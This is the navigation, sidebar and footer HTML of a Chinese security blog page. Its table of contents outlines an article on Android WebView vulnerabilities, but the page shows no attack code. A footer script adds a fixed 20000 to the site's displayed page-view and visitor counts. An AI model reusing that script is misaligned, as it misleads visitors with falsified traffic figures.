class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E5%B8%B8%E7%94%A8%E7%B1%BB"><span class="nav-text">（2）常用类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-1-gt-WebSettings%E7%B1%BB"><span class="nav-text">&lt;1&gt;WebSettings类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-2-gt-WebViewClient%E7%B1%BB"><span class="nav-text">&lt;2&gt;WebViewClient类</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89WebView%E4%B8%8EJS%E7%9A%84%E4%BA%A4%E4%BA%92"><span class="nav-text">（3）WebView与JS的交互</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-1-gt-Android%E8%B0%83%E7%94%A8JS"><span class="nav-text">&lt;1&gt;Android调用JS</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-2-gt-JS%E8%B0%83%E7%94%A8Android"><span class="nav-text">&lt;2&gt;JS调用Android</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81WebView%E7%9A%84%E6%BC%8F%E6%B4%9E%E9%9D%A2"><span class="nav-text">三、WebView的漏洞面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-WebView%E7%9A%84%E6%BC%8F%E6%B4%9E%E9%9D%A2"><span class="nav-text">1.WebView的漏洞面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-WebView%E6%BC%8F%E6%B4%9E%E5%8F%91%E5%B1%95%E6%80%BB%E7%BB%93"><span class="nav-text">2.WebView漏洞发展总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81WebView%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%92%8C%E5%A4%8D%E7%8E%B0"><span class="nav-text">四、WebView的漏洞原理和复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="nav-text">1.历史漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89WebView%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-text">（1）WebView任意代码执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-1-gt-addJavascriptInterface-%E6%8E%A5%E5%8F%A3%E5%BC%95%E8%B5%B7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-text">&lt;1&gt; addJavascriptInterface 接口引起远程代码执行漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-2-gt-searchBoxJavaBridge-%E6%8E%A5%E5%8F%A3%E5%BC%95%E8%B5%B7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-text">&lt;2&gt;searchBoxJavaBridge_接口引起远程代码执行漏洞</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89WebView%E6%98%8E%E6%96%87%E5%AD%98%E5%82%A8%E6%BC%8F%E6%B4%9E"><span class="nav-text">（2）WebView明文存储漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E"><span class="nav-text">2.跨域漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%961%EF%BC%88%E5%BA%94%E7%94%A8%E5%85%8B%E9%9A%86%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="nav-text">（1）任意文件窃取1（应用克隆漏洞）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E9%80%9A%E7%94%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E-%EF%BC%88%E6%81%B6%E6%84%8F%E9%A1%B5%E9%9D%A2%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-text">（2）通用协议漏洞 （恶意页面注入）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E8%B7%A8%E6%BA%90%E6%94%BB%E5%87%BB"><span class="nav-text">（3）符号链接跨源攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%884%EF%BC%89%E6%B1%A1%E6%9F%93Cooike%E6%BC%8F%E6%B4%9E"><span class="nav-text">（4）污染Cooike漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-URL%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E"><span class="nav-text">3.URL配置漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89URL%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E"><span class="nav-text">（1）URL绕过漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-1-gt-%E9%80%9A%E7%94%A8%E7%9A%84URL%E7%BB%95%E8%BF%87"><span class="nav-text">&lt;1&gt;通用的URL绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-2-gt-%E5%B8%B8%E8%A7%81%E7%9A%84url%E6%A0%A1%E9%AA%8C"><span class="nav-text">&lt;2&gt; 常见的url校验</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89hearachical-Uri%E7%BB%95%E8%BF%87"><span class="nav-text">（2）hearachical Uri绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89URL-Scheme%E7%BB%95%E8%BF%87"><span class="nav-text">（3）URL Scheme绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%884%EF%BC%89%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="nav-text">（4）服务端跳转漏洞绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%885%EF%BC%89file%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87"><span class="nav-text">（5）file协议绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Intent-WebView%E6%BC%8F%E6%B4%9E"><span class="nav-text">4.Intent+WebView漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89Intent%E8%AE%BF%E9%97%AE%E5%AF%BC%E5%87%BA%E7%BB%84%E4%BB%B6%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E7%95%8C%E9%9D%A2%E5%92%8C%E7%AA%83%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="nav-text">（1）Intent访问导出组件加载恶意界面和窃取信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89Intent%E9%87%8D%E5%AE%9A%E5%90%91%E5%AF%BC%E8%87%B4launchAnyWhere%E6%BC%8F%E6%B4%9E"><span class="nav-text">（2）Intent重定向导致launchAnyWhere漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Deeplink-WebView%E6%BC%8F%E6%B4%9E"><span class="nav-text">5.Deeplink+WebView漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-text">（1）任意代码执行漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89XSS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">（2）XSS注入漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89DeepLinks%E5%9C%A8WebView%E4%B8%8A%E7%9A%84%E7%BB%84%E5%90%88%E6%BC%8F%E6%B4%9E"><span class="nav-text">（3）DeepLinks在WebView上的组合漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%884%EF%BC%89loadDataWithBaseURL%E6%BC%8F%E6%B4%9E"><span class="nav-text">（4）loadDataWithBaseURL漏洞</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93"><span class="nav-text">五、实验总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-text">六、参考文献</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="安全后厨团队"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">安全后厨团队</p>
  <div class="site-description" itemprop="description">选择有时候比努力更重要</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">48</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/WindXaa" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;WindXaa" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://bbs.pediy.com/user-home-905443.htm" title="看雪 → https:&#x2F;&#x2F;bbs.pediy.com&#x2F;user-home-905443.htm" rel="noopener" target="_blank"><i class="gratipay fa-fw"></i>看雪</a>
      </span>
  </div>



      </div>
	  
	  <div class="wechat_OA">
		<span><b>公众号</b></span>
		<br>
		<!-- 这里添加你的二维码图片 -->
		<img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/weChat.jpg" alt="二维码">
	  </div>
	  <div class="wechat_OA">
		<span><b>知识星球</b></span>
		<br>
		<!-- 这里添加你的二维码图片 -->
		<img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website%2Fstar.png" alt="知识星球">
	  </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2022-12 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">安全后厨团队</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>
<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">博客全站共184.3k字</span>
</div>

    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
    <span class="post-meta-divider">|</span>
<!-- 不蒜子计数初始值纠正 -->
<script>
$(document).ready(function() {

    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
    var countOffset = 20000;  // 初始化首次数据

    function fixCount() {            
       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
        {
            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
            clearInterval(int);
        }                  
        if ($("#busuanzi_container_site_pv").css("display") != "none")
        {
            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
            clearInterval(int); // 停止检测
        }  
    }
       	
});
</script> 


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
